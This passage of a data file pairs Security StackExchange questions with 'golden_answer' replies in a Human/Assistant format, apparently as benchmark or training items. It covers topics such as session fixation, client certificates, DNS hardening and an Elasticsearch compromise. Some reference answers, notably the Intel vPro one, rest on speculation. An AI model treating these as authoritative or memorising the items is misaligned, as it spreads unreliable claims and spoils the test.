breach.  I don't know what this internal system does, but there is one important bit of sensitive information it definitely stores: your user's passwords.  Even if that is all it stores, it is potentially dangerous.  Here is a very plausible worse-case scenario.  What are the odds that you have an administrator that has a user account on this internal system?  If so, what are the odds that that person used the same password for the internal system as the did for the password to administer, say, your company-wide email system?  If so it is a short hop, skip, and jump from cracking an MD5 password to taking control of your email system, and from there to probably any aspect of your company that is web-facing.</p>\n\n<p>While you try to work things out with the people who manage your internal system, you can think through this thought process yourself and take appropriate steps: \"If a malicious user managed to get a hold of the password to email account X, how much trouble could they cause?\".  You would be surprised how many companies out there have effectively their entire system dependent upon the security of a single email account, and that without any 2FA.  If that is the case for your company you should fix that, regardless of what this third-party vendor says.  Otherwise your worst-case-scenario is very bad, and this internal system is just one of many ways in which a malicious attacker may be able to cripple your company.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>If I provide a public-facing website for users on my website at their own subdomain (e.g. <code>bob.myapp.com</code>) under their own control, can I allow them to execute arbitrary JavaScript without putting my main app server at risk (e.g. <code>myapp.com</code>)?  The users would be able to put their own <code>*.js</code> files in the public root of their subdomains.</p>\n\n<p>I have an <strong>extremely</strong> limited understanding of the JS Same Origin Policy, but I believe that different subdomains count as different origins.  Therefore if my main app (<code>myapp.com</code>) is secured from XSS etc., is there anything specific I need to worry about from the users' subdomains that I wouldn't have to worry about for any other external source?</p>\n\n<p>Thanks!</p>\n\n\nAssistant:",
        "golden_answer": " <p>Yes, you do have to worry.  While the subdomains are mostly isolated from your main domain (thanks to the same-origin policy, there are some exceptions that could pose a risk.</p>\n\n<p>One risk has to do with cookies.  Script on <code>bob.myapp.com</code> can set a cookie for <code>myapp.com</code>.  This cookie will be sent to <code>myapp.com</code> when the user visits <code>myapp.com</code>.  This can be used for session fixation attacks.</p>\n\n<p>For instance, malicious user content can set a session cookie (<code>sessionid=1234</code>) with domain <code>myapp.com</code>.  Then when the user visits <code>myapp.com</code>, their browser will send the session cookie set by the attacker.  Since the attacker knows the session ID that the user will be using, the attacker can now hijack their session.</p>\n\n<p>One mitigation is to host the user content on <code>alice.myappusercontent.com</code>, <code>bob.myappusercontent.com</code>, etc., while your app is on <code>myapp.com</code>.  That should stop these attacks.</p>\n\n<p>The classic reference for information about the same-origin policy and isolation on the web is the <a href=\"https://code.google.com/p/browsersec/wiki/Main\" rel=\"noreferrer\">Browser Security Handbook</a>.  See especially the section on the <a href=\"https://code.google.com/p/browsersec/wiki/Part2#Same-origin_policy\" rel=\"noreferrer\">same-origin policy</a> and on <a href=\"https://code.google.com/p/browsersec/wiki/Part2#Life_outside_same-origin_rules\" rel=\"noreferrer\">life outside same-origin rules</a>.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I am asked about my opinion in a case as follows:</p>\n\n<p>Someone visited a (totally legal, in fact US government) website A and identified themselves. At a very different point in time they - allegedly - visited a (doubtlessly very) illegal website B.</p>\n\n<p>US law enforcement claims there is no doubt that the access to B was by the same person/from the same PC as the access to A. If the identification were based on the client's IPv4 address (outside the US!), say, I'd argue that these are typically reassigned to new client's every few hours or days (not to mention shared/NATed use by multiple entities, including WiFi guests), hence is at most very weak evidence. In addition, it currently seems that the non-US ISP was <em>not</em> asked to reveal the identity of their customer associated with the IP in question at the point of time in question. Rather the claim of identity is by comparison with said access to A.\nMeanwhile, it seems that the identification is not claimed to be done by IPv4 address, but rather by something referenced as a \"GUID\" identifying the PC.\nI am not aware of a standard or wide-spread use of any such GUID in any internet protocol that would allow cross-site identification between sites that do not even wish to collaborate on such an issue.</p>\n\n<p>Note that the term GUID was specifically mentioned, i.e., we are not talking about browser fingerprinting or cookies.</p>\n\n<p><strong>Q:</strong> Is there anything \"GUID-like\" that can act as described to identify a PC/device across multiple unrelated(!) sites? In TCP? In http? In TLS? \"Anywhere else\" in the process?</p>\n\n\nAssistant:",
        "golden_answer": " <p>There is no universal GUID that uniquely identifies a computer. It's not possible either, strangely for philosophical reasons.</p>\n\n<p>If you know what the <a href=\"https://en.wikipedia.org/wiki/Ship_of_Theseus\" rel=\"nofollow noreferrer\">Ship of Theseus</a> is, then feel free to skip this part, as you know where I am getting. Otherwise, imagine me having a computer. As it gets older, I sell parts of the hardware (e.g. graphics card, RAM, etc.) to upgrade it. At some point, none of the original parts remain. Is it still the same computer?</p>\n\n<p>Further, what if someone happens to buy all the obsolete parts to assemble another computer. Would <em>that</em> be my computer then?</p>\n\n<p>It's not a question we can answer, because \"a computer\" is not an atomic entity. It's a composition of various pieces. Each individual piece can uniquely be identified (serial number, etc.), but the composition can not.</p>\n\n<p>Of course, you could take one piece of hardware (e.g. the motherboard) and use that as the identity, but at that point you require every motherboard to have a unique identifier.</p>\n\n<h1>What could they possibly have used?</h1>\n\n<p>That's a tough question, and it depends on the details of the scope. One possible candidate would have been third-party tracking cookies. ISPs can use the connection being used to identify customers (not individual devices though), and there have been several instances where ISPs have been found to use such things to track customers.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>For a hash function what is the best secure method, XOR or Concatenate: </p>\n\n<p>h(data1 XOR data2 XOR data3 XOR data4) ? or use h(data1||data2||data3||data4)?</p>\n\n\nAssistant:",
        "golden_answer": " <p>In your example, XOR is a way of scrambling the data. Hash functions already provide good scrambling so concatenating would provide a longer piece of data that would better resist a brute-force attack.</p>\n\n<p>If you use XOR and the attacker can control the <code>data1</code> field, then the attacker can control the output of the XOR operation and the resulting hash. An example would be XOR-ing something controlled by the attacker with a something that is changing, like a time-stamp. The attacker can craft an input in order control the output of the XOR, therefore eliminating the effect of the changing time-stamp.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I'm looking for some clarification around the trust requirements (if any) of client certificates.</p>\n\n<p>I'm working with a third party to access their services via Mutual TLS. </p>\n\n<p>I generate a CSR, send it to the third-party, they send me a certificate (which they've generated using their own CA). It's a single certificate. I haven't been provided with any intermediate certificates - as I'm assuming <strong>you don't need these to issue client certificate authenticated requests</strong>.</p>\n\n<p>When I attempt to connect with this certificate, I get a handshake failure: </p>\n\n<pre><code>openssl s_client -connect the-server.com:443 -cert the-cert.pem -key the-key.pem -state\nCONNECTED(00000003)\nSSL_connect:before/connect initialization\nSSL_connect:SSLv2/v3 write client hello A\nSSL_connect:SSLv3 read server hello A\ndepth=2 /C=US/O=VeriSign, Inc./OU=VeriSign Trust Network/OU=(c) 2006 VeriSign, Inc. - For authorized use only/CN=VeriSign Class 3 Public Primary Certification Authority - G5\nverify error:num=20:unable to get local issuer certificate\nverify return:0\nSSL_connect:SSLv3 read server certificate A\nSSL_connect:SSLv3 read server certificate request A\nSSL_connect:SSLv3 read server done A\nSSL_connect:SSLv3 write client certificate A\nSSL_connect:SSLv3 write client key exchange A\nSSL_connect:SSLv3 write certificate verify A\nSSL_connect:SSLv3 write change cipher spec A\nSSL_connect:SSLv3 write finished A\nSSL_connect:SSLv3 flush data\nSSL3 alert read:fatal:handshake failure\nSSL_connect:failed in SSLv3 read finished A\n78460:error:14094410:SSL routines:SSL3_READ_BYTES:sslv3 alert handshake failure:/BuildRoot/Library/Caches/com.apple.xbs/Sources/OpenSSL098/OpenSSL098-59/src/ssl/s3_pkt.c:1145:SSL alert number 40\n78460:error:140790E5:SSL routines:SSL23_WRITE:ssl handshake failure:/BuildRoot/Library/Caches/com.apple.xbs/Sources/OpenSSL098/OpenSSL098-59/src/ssl/s23_lib.c:185:\n</code></pre>\n\n<p>I'm being told that it's failing as: <em>'the pem files do not contain the public CA certs that signed the client certificate'</em> however if this was the case, would the client even send the certificate (as it appears to be doing so in the TLS negotiation steps above) if it was the case that it needed to trust it?</p>\n\n\nAssistant:",
        "golden_answer": " <blockquote>\n<p>Do client certificates need to be trusted by the client?</p>\n</blockquote>\n<p>No, the client certificate is only validated by the server and the server certificate only by the client. Thus any kind of trust regarding the client certificate or its signing CA is only needed at the server.</p>\n<blockquote>\n<p>... It's a single certificate, with no intermediate</p>\n<p>... the pem files do not contain the public CA certs that signed the client certificate</p>\n</blockquote>\n<p>I would suggest that the first statement is wrong, i.e. that the certificate you got was actually signed by an intermediate CA and you did not include the necessary chain certificates. The root certificates itself should not be send because these have to reside as trusted at the side which is doing the validation, i.e. the server in case of client certificates.</p>\n<p>I would suggest that you'll find out which CA they have as pre-trusted at the server side and compare this with the issuer of your certificate. If they don't match then chain certificates are missing. If they match than it might be a problem with the setup on the server side, i.e. that they don't have the necessary CA configured as trusted by the server for client authentication.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I have recently started working for a company which disables external DNS resolution from the machines inside the network by not adding external forwarders to the internal DNS servers - the reasoning behind this is for security.</p>\n\n<p>It seems a bit heavy-handed to me and it's causing me issues as the company moves towards more cloud services.</p>\n\n<p>Can anyone suggest a way that I could reach a compromise to provide security? I was thinking we should use external forwarders but apply filtering e.g <a href=\"https://docs.microsoft.com/en-us/windows-server/networking/dns/deploy/apply-filters-on-dns-queries\" rel=\"nofollow noreferrer\">https://docs.microsoft.com/en-us/windows-server/networking/dns/deploy/apply-filters-on-dns-queries</a></p>\n\n\nAssistant:",
        "golden_answer": " <p>When firewalls are correctly configured, DNS is our way into and out of the network. Depending on your security level, blocking DNS where it is not needed can be useful hardening.</p>\n\n<p>As a security consultant, it is not that uncommon to find yourself in a system with a limited server-side request forgery or some other server-side vulnerability. Some customers have very well-configured firewalls which prevent us from using it to get much further, but through DNS we can typically still learn more about the network and sometimes setup useful data tunnels. In such a case, disabling DNS would be the final nail in the coffin.</p>\n\n<blockquote>\n  <p>it's causing me issues</p>\n</blockquote>\n\n<p>That is the risk: if you disable DNS and someone does need it (for example for <code>apt update</code>), you risk that sysadmins use ugly workarounds, making the network less secure instead of more secure. If you can't do your work properly, then disabling DNS altogether is not the right choice.</p>\n\n<p>Might a limited resolver be a solution? It could run on localhost or perhaps on a dedicated system, and it could be configured to only resolve a whitelist of domains. Since you mention you're moving your data and applications to other people's computers (\"the cloud\"), it sounds like you might only need to resolve the domains belonging to whatever SaaS/*aaS service your company uses.</p>\n\n<p>The pitfall there is that whitelisting something like <code>*.cloudCorp.example.com</code> probably allows an attacker to buy a VPS at cloudCorp and get a matching domain name. That would be something to watch out for. But even if this is unavoidable (and that's not a given), it's better than allowing all DNS queries.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I am using the most verbose debug option of ssh (concretely: OpenSSH_8.2p1) <code>ssh -vvv</code> and I am wondering what information the output exposes.</p>\n<p>Of course the output contains the username and the server one is trying to connect to, however there is quite a lot more.</p>\n<p><strong>What information is exposed by this debug information? What could an attacker do with this information?</strong></p>\n<p>For example, would it be safe to send the output to a service desk or ask in an internet forum for help with a problem and giving the output of <code>ssh -vvv</code> without replacing some information? Would that allow or help a third party to access the server, break the encryption, etc.?</p>\n\n\nAssistant:",
        "golden_answer": " <p>The private keys are not displayed, not even ephemeral ones used only for that session.</p>\n<p>But public keys are displayed. Person with access to output of <code>ssh -vvv</code> would be able to identify the server in an internet scan (if server is open to the internet) and identify the client using something like &quot;ssh public key is associated with github account&quot;.</p>\n<p>So this is a privacy problem, but not a way to attack the server or the client, IMO.</p>\n<p>If an insecure authentication method is enabled, even if it is not used, person with access to output would see that, and might try to attack the server or the client using that insecure method. There are tools to scan servers (e.g. <a href=\"https://discovery.cryptosense.com/\" rel=\"noreferrer\">this</a>) but the information about the configuration of the client is new to the attacker. The attacker might get the same information by MiTM or by tricking client to try to connect to it without pretending to be something else.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I am conducting a penetration test on a website and am trying to prove that php code can be executed with the file upload. The website allows for file uploads but it checks for: </p>\n\n<p>1: Filetype</p>\n\n<p>2: Extension (Only jpeg or png)</p>\n\n<p>3: File size (Max 2MB). </p>\n\n<p>So, it is possible to upload a file (test.php.png), I therefore thought that adding in PHP code inside the Exif data would run but it does not, why is this?</p>\n\n\nAssistant:",
        "golden_answer": " <ol>\n<li>To execute injected php code it should be possible to call targeted file directly and its extension must be in the list that server may handle for. By default it is *.php</li>\n<li>It is possible to include any file into other php script on the server in case <a href=\"https://www.owasp.org/index.php/PHP_File_Inclusion\" rel=\"nofollow noreferrer\">LFI</a> vulnerability is exploitable in the code.</li>\n</ol>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Some softwares such as Computertrace claim that it can survive on a laptop even if the thief successfully reinstalls the operating system, reformats the hard drive, or (in some laptop models) swaps out the hard drive. How could this happen? Won't all the data associated by the software with the computer be erased?</p>\n\n\nAssistant:",
        "golden_answer": " <p>Some software vendors partner with BIOS makers (e.g. <a href=\"http://www.absolute.com/en/partners/bios-compatibility\" rel=\"nofollow\">Absolute</a>) so that even if an operating system is re-installed, on network connection, the BIOS may be able to send back relevant information. Many of these products are gimmicky, for example LoJack can be blocked at a <a href=\"http://cryptome.org/lojack-hack.pdf\" rel=\"nofollow\">firewall/network level</a> that will disallow it from phoning home.</p>\n\n<p>These types of software are primarily aimed at someone needing low level security versus highly secured laptops/network/data whose attackers are determined threat actors. Meaning, they're aimed at someone likely to be exposed to say common theft (drug user, someone taking it to a pawnshop), versus someone on a state level who would likely remove the disk for data. (Remember data is worth a lot more than a laptop).</p>\n\n<p>EDITED</p>\n\n<p>I needed to expand on this a little on the downfalls of using applications like these. When applications like these <strong><em>DO detect</em></strong> the location of a laptop, the reality is, what can they do, and what are they determining for you? They will retrieve a network based location nothing more. They will not give you information on how to get the device back, so most offer a \"wipe data now\" feature, which works (again) for low level attackers. The reality is, they will return output to you stating: \"Your machine is located on network 10.10.10.1\" which means little given that any ISP <strong>will not</strong> give you information on say one of their users using DHCP on that network. For that you would need a court order.</p>\n\n<p>Nowadays, you can modify Team Viewer to act as a similar \"phone home\" application if you modify your registry. In modifying your registry, you can remove the visuals showing Team Viewer from the toolbar, from the process manager, and so forth. Malware authors have taken to do this at times. </p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>What's the required key usage/extended key usage for signing documents, eg.PDF, Word, PowerPoint, Excel, etc...</p>\n<p>I am going to create a self-signed certificate that is needed to sign those documents. I wonder which key usage is required as there are many types that I can choose.</p>\n<p>Note: I just need a self-signed certificate, not from trusted CAs.</p>\n\n\nAssistant:",
        "golden_answer": " <p>You can use keyusage as &quot;digitalSignature&quot; only to create self-signed signing certificate for signing documents.</p>\n<p>Additionally, you can add the following:</p>\n<ol>\n<li><p>keyUsage</p>\n<ul>\n<li>nonRepudiation (Good to have, since CA add this in document signing\ncertificate)</li>\n</ul>\n</li>\n<li><p>extendedKeyUsage/EnhancedKeyUsage:</p>\n<ul>\n<li>1.3.6.1.4.1.311.3.10.3.12 (Microsoft Document Signing)</li>\n<li>1.2.840.113583.1.1.5 (Adobe Authentic Documents Trust)</li>\n</ul>\n</li>\n</ol>\n<p>For more information, you can refer below URL:</p>\n<p><a href=\"https://www.globalsign.com/en/repository/GlobalSign_DocumentSign_for_Adobe_CDS_CPS_v1.3.pdf\" rel=\"nofollow noreferrer\">https://www.globalsign.com/en/repository/GlobalSign_DocumentSign_for_Adobe_CDS_CPS_v1.3.pdf</a></p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I have been studying about computer security and at some point i came across the terms of <strong>onion routing</strong> and <strong>crowds</strong>. From what i have understood they are very similar in their usage (interchangeable). </p>\n\n<p>Is there any specific situation where anyone would want to use the one or the other better?</p>\n\n\nAssistant:",
        "golden_answer": " <p>Crowds and Onion Routing are both used to create anonymous networks, but implemented in two different ways.</p>\n\n<h2><strong><a href=\"https://en.wikipedia.org/wiki/Onion_routing\">Onion Routing</a></strong></h2>\n\n<p><strong>Basic Operation</strong></p>\n\n<p>Anonymous networks like Tor rely on passing through multiple nodes with a layer of encryption added at each node.  This circuit is randomly predetermined when a node enters the network.  As the data passes through each node a layer is <em>peeled</em> off (like an onion) until the Exit Node.  At which the data sent is forwarded in the \"clear<sup>1</sup>\" to its destination.  As long as there are at least three nodes in the circuit taken to the destination no one node knows where the data originated <em>and</em> its destination at once.  This is how anonymity is achieved, but remember that <a href=\"https://security.stackexchange.com/questions/72679/differences-between-using-tor-browser-and-vpn\">Tor does not guarantee security</a>.</p>\n\n<p><strong><a href=\"https://security.stackexchange.com/questions/76438/about-onion-packet-and-onion-routing\">Key Distribution</a></strong></p>\n\n<p>Tor uses its own protocol to negotiate symmetric keys for each hop.  This is done by requesting session keys from each of the hops in the circuit.  The nodes then respond with a session key encrypted using public key cryptography (I believe Tor uses Diffie Hellman).  With a key for each circuit node the data can now be encrypted.  It's encrypted with the last node's key first, and then layers the encryption backwards ending with a final layer of encryption with the first node's key.   </p>\n\n<h2><strong><a href=\"https://en.wikipedia.org/wiki/Crowds\">Crowds</a></strong></h2>\n\n<p><strong>Basic Operation</strong></p>\n\n<p>With Crowds a user will join a <strong>crowd</strong>.  This is done using a client, <strong>Jondo</strong> (John Doe, get it!) on the user's machine.  To join a crowd you go through a server called a <strong>blender</strong>.  Here's an exerpt from the Wiki page:</p>\n\n<blockquote>\n  <p>Each user joins a crowd of other users by registering himself at the\n  <strong>blender</strong> which is a single server <strong>responsible for membership\n  management</strong>. When a user registers, all the other members in the crowd\n  are notified. The blender is <strong>also responsible for key distribution</strong>, as\n  it distributes symmetric keys to individual pairs of jondos, used for\n  encryption and decryption, respectively of packets routed along the\n  virtual paths.</p>\n</blockquote>\n\n<p>So once you're in the crowd you can make requests, and the request will randomly (uniform probability) choose a jondo to forward the request through.  At that point a coin flip (figuratively, probably equal to <em>P<sub>f</sub> > 0.5</em>) is used to either forward to another random node, or forward to the destination.  In this sense the request gets mixed in with all other requests moving through the jondos.  Each node records the predecessor to create a tunnel from the source to the destination.  Due to the coin flip each node cannot tell if the message originated with its predecessor or not.</p>\n\n<p><strong>Key Distribution</strong>\nAccording to the white paper (linked below):</p>\n\n<blockquote>\n  <p>To make use of the blender (and thus the crowd), the user must\n  establish an account with the blender, i.e., an account name and\n  password that the blender stores.When the user starts a jondo, the\n  jondo and the blender use this shared password to authenticate each\n  other’s communication. As a result of that communication (and if the\n  blender accepts the jondo into the crowd; see Section 8.2), the\n  blender adds the new jondo (i.e., its IP address, port number, and\n  account name) to its list of members, and reports this list back to\n  the jondo. In addition, the blender generates and reports back a list\n  of shared keys, each of which can be used to authenticate another\n  member of the crowd. The blender then sends each key to the other\n  jondo that is intended to share it (encrypted under the account\n  password for that jondo) and informs the other jondo of the new\n  member.</p>\n</blockquote>\n\n<p>It also states that in a future version (unsure what is considered to be a future version at this point) that it will use Diffie Hellman for key distribution.</p>\n\n<blockquote>\n  <p>We anticipate that in future versions of Crowds, jondos will establish\n  shared keys using Diffie-Hellman key exchange [Diffie and Hellman\n  1976], where the blender serves only to distribute the Diffie-Hellman\n  public keys of crowd members. This will eliminate the present reliance\n  on the blender for key generation.</p>\n</blockquote>\n\n<p><strong>Differences</strong></p>\n\n<p>The difference here is that with Crowds each pair of nodes has a <em>different</em> symmetric key used to encrypt the data between nodes.  A <strong>path key</strong> is established for each path that will encrypt the actual request and response.  This is forwarded along the path by using the symmetric key of each pair of nodes.  But there is no <em>layering</em> here.  With the randomness of Crowds you wouldn't want to encrypt the data 10 times.  The latency could grow out of control.</p>\n\n<p>Also, Tor does not require an account to establish an initial connection to the network.  Now once Crowds begins using DH this account might no longer be necessary, and anonymous<sup>2</sup> connections to a crowd could be possible.  </p>\n\n<p>The other main difference is how circuits are chosen.  While Tor relies on choosing a circuit of 3 Crowds relies on randomness to determine how many nodes are taken.  It could be 2, 3, or 15.  Depends on that coin flip.  </p>\n\n<hr>\n\n<p>As far as use cases, they're both anonymous technologies.  In that sense they're interchangeable, but they are very different implementations of anonymous networks.  I think it's more a preference as to which one you choose to use.  Obviously having to create an account to use the Crowds service might be a disadvantage, but perhaps you like randomness of its circuits more.  Either one will be suitable for the purpose it just depends on your comfort level, and what you prefer in the end.</p>\n\n<p><strong>Details on each Protocol</strong></p>\n\n<p><a href=\"http://avirubin.com/crowds.pdf\">Crowds white paper (PDF)</a> <br>\n<a href=\"https://svn.torproject.org/svn/projects/design-paper/tor-design.pdf\">Tor white paper (PDF)</a></p>\n\n<hr>\n\n<p><sup>1</sup> <em>Clear</em> is defined as how the data was originally sent from the source.  If this data was encrypted then its not technically plaintext, but there is no added encryption by Onion Routing to data passed through the circuit.</p>\n\n<p><sup>2</sup> By <em>anonymous</em> I mean no account that could possibly link a user to a specific crowd.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>And also as an everyday user who mostly just surfs the web, are these risks a huge concern for me?  </p>\n\n<p>Edit: Also on the similar note, are there any substantial evidences of Intel or AMD purposely adding malware to their SMMs either for themselves or for the NSA?</p>\n\n\nAssistant:",
        "golden_answer": " <p>The new Intel Core vPro processors contain a remote access feature that allows full remote access to a PC at any time, even if when the computer is turned off.  As long as the power supply is available, the system can be woken up by the Core vPro processor, which is able to quietly turn individual hardware components on and access anything on them.</p>\n\n<p>According to Mr Jonathan Brossard, a leading Security Research Engineer, \"this is a feature that is documented  and well understood\" [...] There is absolutely no reason to believe this is being misused by NSA or whoever. \nSo practically, the only thing preventing the usage of such 'features' is morality, which is proved multiple times to be lacking on the mentioned organization &amp; Co. </p>\n\n<p><a href=\"http://news.softpedia.com/news/Secret-3G-Radio-in-Every-Intel-vPro-CPU-Could-Steal-Your-Ideas-at-Any-Time-385194.shtml\" rel=\"noreferrer\">Secret 3G Radio in Every Intel vPro CPU Could Steal Your Ideas at Any Time</a></p>\n\n<p><a href=\"http://www.pcmag.com/article2/0,2817,2369110,00.asp\" rel=\"noreferrer\">Intel's 'Sandy Bridge' Chip to Include vPro Business Features</a></p>\n\n<p>For the normal web user, there should be no problem, but it is highly likely that certain keywords will trigger events that will cause the listing of the system under 'to be investigated' category.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Assuming a product shelf life of 30 years and the product which is released now in 2021, what is the recommendation/suggestion for hashing or encryption algorithms to use in the product?\nThat means, should I directly make use of the superior algorithms(SHA-512 for hashing, AES-256 for encryption) or should this be driven by SAL(Security Assurance Level) or any other different factors?</p>\n<p>Also, are there any recommendations from NIST to choose these based on the product's shelf life?</p>\n\n\nAssistant:",
        "golden_answer": " <p>Using SHA-512 and AES-256 as you suggest is generally not wrong. But this may change in the future.</p>\n<p>In detail: It depends on the usecase.</p>\n<p>Do you need a block cipher or a stream cipher? Do you want to hash passwords or something else? There are multiple possible algorithms available.</p>\n<p>It is required to use appropriate functions, and not outdated/broken functions.  But maybe even more important: Every algorithm can be broken in the future. So it is very important that your product has the ability to be updatable and introduce new hash-/encryption-algorithms which replace the old ones.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>This question as been asked before it seems, but I could use some advice myself for my specific situation. I am very frustrated with my university. I study software engineering and I am very bored. I finished my first year of college awhile back and I didn't learn much mostly calculus and chemistry. The main advantage is the cyber defense competitions which we do and I was able to win that last spring and got an internship at a company for the next academic year part time (20 hours a week) doing InfoSec work (security monitoring and internal penetration testing is what I am told).</p>\n\n<p>I am frustrated by the university now I have to study Diffeq and physics this summer and I would much rather be reverse engineering, working on a blog to showcase my skills, and getting certifications. People who don't work in InfoSec have told me I need a college degree, but when I meet people who are seniors and have been through all these courses and can barely explain how what SQL injection is let alone how to exploit it I begin to question that logic. </p>\n\n<p>I have been studying InfoSec since I was in middle school and while I am no expert I do know a thing or two. I am great at teaching myself. I have another company I am trying to get an internship at who had challenges online and I completed all of them and sent them my resume. </p>\n\n<p>Unfortunately, they had already hired interns because I did not find the challenges until very late, but said I could contact them in the fall. I feel like I have all the skills to get into the InfoSec field, but lack the college degree. If I did my internship next academic year and instead of going to university I got the OSCP, OSCE, and OSWP certifications could I just leave college and go work in the InfoSec field? Could I get a full time job as an entry level penetration tester. I don't really care if it is a junior position I just want to turn my hobby into a career and going to college does not seem to be getting me where I want to be. Getting a job in the field I would be able to work in security full time while being able to spend all my free time (I love what I do) continuing to improve my skills I don't think I would have any problems at all and would not have to spend three more years or four more years for the masters program of my life at university. </p>\n\n<p>I know this question has been asked before, but I could use some solid advice.I really very much would love to work in the InfoSec field and not have to spend any more time at college bored, but I will do it if that is what it takes.I have seen a number of blog posts by people who say you don't need a college degree for InfoSec. This is really a gamble and if I am going to take it then I could use some guidance. </p>\n\n<p>TL; DR if I left college and got some certifications to prove my skills would I be able to get a job. I have an internship for the next academic year which is part time doing internal penetration testing and security monitoring. But, if instead of going to college I spent that time getting the OSCP, OSCE, and OSWP certifications with that work experience could I get a job as an entry level penetration tester without a college degree. I am bored in college and want to be challenged and not have to work around college bureaucracy to have time to study InfoSec. </p>\n\n\nAssistant:",
        "golden_answer": " <p>Yes and No, Yes you can leave college and get a job as a pen tester and work in infosec doing that. I will tell you though as someone without a college degree that works in infosec that not having college degree does hold you back in some parts of the field. </p>\n\n<p>There are a ton of HR departments that hold very dear to the idea that anybody without a college degree is not worth considering. It will be an uphill battle of proving your worth for every job that you get. If I was to be starting over right now I would have stayed in school and gotten my degree. </p>\n\n<p>You are on the right path though. Start now getting your name and experience built up and when you get out of college you will have a leg up on everyone else. </p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I have successfully changed my MAC address using <code>macchanger</code> from XX:XX:XX:XX:XX:XX to YY:YY:YY:YY:YY:YY. I executed <code>ip neigh</code> on Kali Linux and  got this output: <code>192.168.0.1 dev eth0 lladdr ZZ:ZZ:ZZ:ZZ:ZZ:ZZ STALE</code>. I am using a Modem Router. I want to know where this new MAC address is coming from and how I can change it.</p>\n\n\nAssistant:",
        "golden_answer": " <p>That IP is <strong>another</strong> device on the network and, based on its IP, I suspect it's the gateway. You can't change that MAC from your Kali box, you'll need to do it from the device broadcasting that MAC. </p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I am trying to figure out how it was compromised. They installed <strong>IptabLes</strong> and <strong>IptabLex</strong> in <code>/boot</code>.\n<br>\nThey also added <code>/etc/init.d/IptabLes</code> and <code>/etc/init.d/IptabLex</code> which simply call the respective <code>/boot</code> files. It seems this attack uses a lot of bandwidth (probably a DDoS); I noticed it immediately.</p>\n\n<p>The server is running CentOS 6.5 with all the latest updates.\n<br>\nIt runs <code>logstash</code>, <code>redis</code>, <code>ElasticSearch</code>, and <code>Cherokee</code> webserver serving Kibana.\n<br>\nI am thinking it must either be ElasticSearch or Cherokee web-server.</p>\n\n<p>ElasticSearch port (9200) was open to the world, because Kibana requires it to view the nice graphs. Redis ports (6379) were restricted to only 5 known hosts via iptables.\n<br>\nCherokee webserver runs on port (8080) not default of 80 and was open to the world.</p>\n\n<p>SSH does not seem to be compromised. The server uses keys and no password authentication\n<br>\nis allowed. We run SSH on port 2020, which is listed as (xinupageserver) in iptables.</p>\n\n<p>Here are the iptables rules. Notice redis is restricted to web hosts,\n<br>\nbut http via Cherokee (webcache) and ElasticSearch (wap-wsp) are open.</p>\n\n<pre><code>➜  ~  iptables -L\nChain INPUT (policy ACCEPT)\ntarget     prot opt source               destination         \nACCEPT     all  --  anywhere             anywhere            \nREJECT     all  --  anywhere             loopback/8          reject-with icmp-port-unreachable \nACCEPT     all  --  anywhere             anywhere            state RELATED,ESTABLISHED \nACCEPT     tcp  --  anywhere             anywhere            state NEW tcp dpt:xinupageserver \nACCEPT     tcp  --  web1.mydomain.com     anywhere            tcp dpt:6379 \nACCEPT     tcp  --  web2.mydomain.com    anywhere             tcp dpt:6379 \nACCEPT     tcp  --  web3.mydomain.com     anywhere            tcp dpt:6379 \nACCEPT     tcp  --  web4.mydomain.com     anywhere            tcp dpt:6379 \nACCEPT     tcp  --  web5.mydomain.com     anywhere            tcp dpt:6379 \nACCEPT     tcp  --  anywhere             anywhere            tcp dpt:wap-wsp \nACCEPT     tcp  --  anywhere             anywhere            tcp dpt:webcache \nACCEPT     icmp --  anywhere             anywhere            icmp echo-request \nREJECT     all  --  anywhere             anywhere            reject-with icmp-port-unreachable \n\nChain FORWARD (policy ACCEPT)\ntarget     prot opt source               destination         \nREJECT     all  --  anywhere             anywhere            reject-with icmp-port-unreachable \n\nChain OUTPUT (policy ACCEPT)\ntarget     prot opt source               destination         \nACCEPT     all  --  anywhere             anywhere \n</code></pre>\n\n<p>Thanks so much for the help.</p>\n\n\nAssistant:",
        "golden_answer": " <p>You should never leave Elasticsearch open to the world, in the same way as you wouldn't leave any database server open to the world.  Always put a proxy in front of it and use (at least) HTTP auth.  Preferably, your proxy should limit what can be done from outside, eg only allowing GET requests, otherwise any user could delete all your data or shutdown your servers.</p>\n\n<p>From version 1.2.0 onwards, dynamic scripting (passing a script as part of eg a search request) has been disabled by default.  On older versions it is enabled by default, meaning that any outside user could do anything on your server that the Elasticsearch user can do.</p>\n\n<p>If you're running an older version, you want to add this to your <code>config/elasticsearch.yaml</code>:</p>\n\n<pre><code>script.disable_dynamic: true\n</code></pre>\n\n<p>See <a href=\"http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/modules-scripting.html#_enabling_dynamic_scripting\" rel=\"nofollow\">http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/modules-scripting.html#_enabling_dynamic_scripting</a> for more, and <a href=\"http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/url-access-control.html#url-access-control\" rel=\"nofollow\">http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/url-access-control.html#url-access-control</a></p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>A website \"broke\" after I changed my password to something like  \"NÌÿÖÏï£Ø¥üQ¢¨¼Ü9¨ÝIÇÅbÍm\". I was unable to log in, and customer service deleted my account and had me create a new one. Does this imply security flaws in the site's code? Should I worry about my credentials?</p>\n\n<p>Obviously I'm using a password manager, and the website only allows me to reserve seats in a cinema, so the credentials are not of much value.</p>\n\n\nAssistant:",
